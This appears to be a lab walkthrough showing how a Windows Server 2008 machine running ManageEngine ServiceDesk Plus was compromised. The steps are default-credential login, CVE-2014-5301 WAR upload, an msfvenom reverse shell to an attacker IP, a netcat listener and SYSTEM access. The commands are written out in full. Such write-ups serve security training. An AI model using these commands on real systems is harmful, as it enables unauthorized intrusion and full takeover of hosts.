# Helpdesk - ManageEngine ServiceDesk Exploitation Walkthrough

This is a full exploitation walkthrough for the Helpdesk lab machine running Windows Server 2008. The objective was to exploit an authenticated file upload vulnerability in ManageEngine ServiceDesk Plus and gain SYSTEM-level access.

## Target Information

IP Address: 192.168.212.43  
Hostname: HELPDESK  
Operating System: Windows Server 2008 Standard SP1  
Web Application: ManageEngine ServiceDesk Plus  
Port: 8080 (Apache Tomcat)

## Enumeration

Performed an initial Nmap scan:

nmap -T4 -A -Pn 192.168.212.43 -o nmap

Open ports discovered:
- 135 (Microsoft RPC)
- 139 (NetBIOS-SSN)
- 445 (Microsoft-DS / SMB)
- 3389 (RDP)
- 8080 (Apache Tomcat - ManageEngine ServiceDesk)

Additional Info:
- OS: Windows Server 2008 Standard SP1  
- Hostname: HELPDESK  
- Workgroup: WORKGROUP  
- SMB message signing: disabled  
- Guest login allowed  

## Web Enumeration

Visited: http://192.168.212.43:8080  
Found: Login page for ManageEngine ServiceDesk Plus

Performed Google search for default credentials:  
Successfully logged in using:

Username: administrator  
Password: administrator

## Exploitation - CVE-2014-5301

Identified that this version of ManageEngine is vulnerable to an **authenticated WAR file upload** vulnerability.

Used public exploit:

https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py

Generated malicious Java WAR reverse shell using msfvenom:

msfvenom -p java/shell_reverse_tcp LHOST=192.168.45.167 LPORT=445 -f war -o pwnz.war

Uploaded the WAR file using the exploit script:

python3 CVE-2014-5301.py 192.168.212.43 8080 administrator administrator pwnz.war

Started listener:

rlwrap nc -nlvp 445

Received reverse shell as:

NT AUTHORITY\SYSTEM

## Captured Flag

Located file:

C:\Users\Administrator\Desktop\proof.txt

Flag:

3c03e10e4b256e5797f9295c9c7b716d

## Tools Used

- nmap  
- ManageEngine default credentials  
- CVE-2014-5301 exploit script  
- msfvenom  
- rlwrap + netcat

## Summary

- Discovered exposed web interface on port 8080  
- Logged in using default credentials  
- Exploited CVE-2014-5301 to upload malicious WAR file  
- Received SYSTEM-level shell using reverse connection  
- Retrieved administrator flag

## Author

Farhanahmad Quraishi
